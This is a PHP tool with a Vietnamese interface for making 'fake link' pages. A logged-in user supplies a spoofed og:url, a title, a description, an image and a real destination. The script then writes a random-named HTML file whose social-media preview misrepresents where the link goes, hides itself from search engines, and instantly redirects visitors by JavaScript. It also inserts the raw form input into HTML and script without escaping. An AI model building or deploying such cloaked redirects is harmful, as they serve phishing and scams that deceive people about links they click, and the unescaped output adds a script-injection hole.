<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
    header("location:index.php");
    exit;
}



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
        @import "bourbon";

    body {
        background: #eee !important;
    }

    .wrapper {
        margin-top: 80px;
      margin-bottom: 80px;
    }

    .form-signin {
      max-width: 380px;
      padding: 15px 35px 45px;
      margin: 0 auto;
      background-color: #fff;
      border: 1px solid rgba(0,0,0,0.1);

      .form-signin-heading,
        .checkbox {
          margin-bottom: 30px;
        }

    .checkbox {
      font-weight: normal;
    }

    .form-control {
      position: relative;
      font-size: 16px;
      height: auto;
      padding: 10px;
        @include box-sizing(border-box);

        &:focus {
          z-index: 2;
        }
    }

    input[type="text"] {
      margin-bottom: -1px;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
    }

    input[type="password"] {
      margin-bottom: 20px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }
}

    </style>
</head>
<body>
    <div class="container">
    <form action="" method="post">
    <label>Fake link: (Nếu dùng fake link chỉ điền ô này)</label>
    <input class="form-control" type="text" name="fake_link" id="textbox"/> </br>
    <label>Tiêu đề:</label>
    <input class="form-control" type="text" name="title" id="textbox"/> </br>
    <label>Mô tả:</label>
    <input class="form-control" type="text" name="description" id="textbox"/> </br>
    <label>Link ảnh:</label>
    <input class="form-control" type="text" name="image" id="textbox"/> </br>
    <label>Địa chỉ Đến:</label>
    <input class="form-control" type="text" name="url" id="textbox"/> </br>
    <input type="submit" value="Fake" class="btn btn-lg btn-primary"/></br>
    <br>
    </form>
    <?php
    error_reporting(0);
    if($_POST["url"]){
    // $n=rand(0000,9999);
    $pathname = substr(md5(microtime()),rand(0,26),10);

    $file = $pathname.".html";
    $fh= fopen($file,'w');
    $newString = "
<!DOCTYPE HTML>
<html>
<head>
<meta content='".$_POST['title']."' property='og:title'>
<meta content='article' property='og:type'>
<meta content='".$_POST['description']."' name='og:description'>
<meta content='".$_POST['image']."' property='og:image'>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
<meta name='googlebot' content='noarchive'/>
<meta content='noindex, nofollow' name='robots'/>
<meta property='og:image' content='".$_POST['image']."'>
<meta property='og:image:width' content='728'>
<meta property='og:image:height' content='410'>
<title>'".$_POST['title']."'</title>
<meta property='og:url' content='".$_POST['fake_link']."'>
<!-- <script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = '".$_POST['url']."';
// ]]></script>
<meta http-equiv='refresh' content='0;url=".$_POST['url']."'> -->
</head>
<body>
<p>".$_POST['title']."</p>
<script>
window.location = '".$_POST['url']."';
</script>
</body>
</html>
    ";
    $string = '

    <html xmlns="http://www.w3.org/1999/xhtml" lang="vi" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="googlebot" content="noarchive"/>
    <meta content="noindex, nofollow" name="robots"/>
    <meta property="og:url" content="'.$_POST["url"].'"/>
    <title>loading...</title>
    <script type="text/javascript" language="javascript">window.location="'.$_POST["url2"].'";</script>
    </head>
    <body>
    </body>
    </html>';
    fwrite($fh,$newString);
    fclose($fh);
    echo "Link share: " . "<a href =' $file'>" . $file . "</a>";
    }
    ?>
<br><br>
<textarea name="update" rows="20" cols="70">
    <?php echo file_get_contents($file);?>
    </textarea>
    </div>
</body>
</html>

